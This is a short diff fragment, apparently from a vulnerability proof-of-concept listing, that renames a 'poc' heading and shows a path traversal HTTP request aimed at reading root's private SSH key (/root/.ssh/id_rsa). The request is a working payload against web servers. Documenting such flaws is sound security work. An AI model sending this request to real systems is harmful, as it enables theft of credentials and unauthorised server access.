@@ -2,7 +2,7 @@
 
 
 
-## poc
+## POC
 
 ```yaml
 GET /../../../../../../../../..//root/.ssh/id_rsa HTTP/1.1
